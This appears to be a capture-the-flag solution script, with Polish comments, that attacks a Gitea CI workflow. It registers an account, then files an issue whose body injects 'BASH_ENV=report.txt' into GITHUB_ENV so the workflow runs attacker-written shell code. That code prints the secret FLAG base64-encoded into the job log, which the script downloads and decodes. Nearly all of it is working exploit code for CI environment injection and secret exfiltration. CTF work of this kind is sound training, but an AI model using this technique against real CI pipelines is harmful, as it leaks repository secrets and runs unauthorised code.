# 1) rejestracja (formularz zwraca login i jednorazowe hasło)
curl -si -c jar -b jar https://skeldhub.ckctf.kliprmimo.com/register --data-urlencode "nick=crew-$RANDOM" | grep -vE '^\s*[.a-z#@:-].*[{;}]\s*$' | sed -n '1,20p;/<main/,/<\/main>/p'
# 2) zapis danych logowania i rekonesans przez API Gitei
printf 'crew-23529:<HASLO>' > creds
# 3) issue z payloadem: kilka linii Room: wstrzykuje BASH_ENV=report.txt do GITHUB_ENV
B=https://skeldhub.ckctf.kliprmimo.com/api/v1; A="-u $(cat creds)"; BODY=$'echo "X:$(printf %s "$FLAG" | base64 -w0)"; exit 0\nRoom: Electrical\nRoom: BASH_ENV=report.txt\nSuspect: Red\nDetails: vent'; python3 -c 'import json,sys;print(json.dumps({"title":"Sus activity","body":sys.argv[1]}))' "$BODY" > issue.json; curl -s $A -H 'Content-Type: application/json' -d @issue.json $B/repos/mira-hq/skeld-crew-23529/issues | python3 -c 'import json,sys;d=json.load(sys.stdin);print(d.get("number"),d.get("message"))'
# 4) czekanie na workflow
B=https://skeldhub.ckctf.kliprmimo.com/api/v1; A="-u $(cat creds)"; R=$B/repos/mira-hq/skeld-crew-23529; for i in $(seq 1 36); do S=$(curl -s $A $R/actions/runs | python3 -c 'import json,sys;d=json.load(sys.stdin)["workflow_runs"];print(d[0]["id"],d[0]["status"]) if d else print("none")'); echo "$S"; case "$S" in *completed*) break;; esac; sleep 5; done; RID=${S%% *}; curl -s $A $R/actions/runs/$RID/jobs | python3 -c 'import json,sys;[print(j["id"],j["name"],j["status"],j["conclusion"]) for j in json.load(sys.stdin)["jobs"]]'
# 5) log joba i dekodowanie base64
B=https://skeldhub.ckctf.kliprmimo.com/api/v1; A="-u $(cat creds)"; curl -s $A $B/repos/mira-hq/skeld-crew-23529/actions/jobs/141/logs > job.log; grep -nE 'X:|Crew dispatched|BASH_ENV|error' job.log | head; grep -oE 'X:[A-Za-z0-9+/=]+' job.log | head -1 | cut -c3- | base64 -d; echo
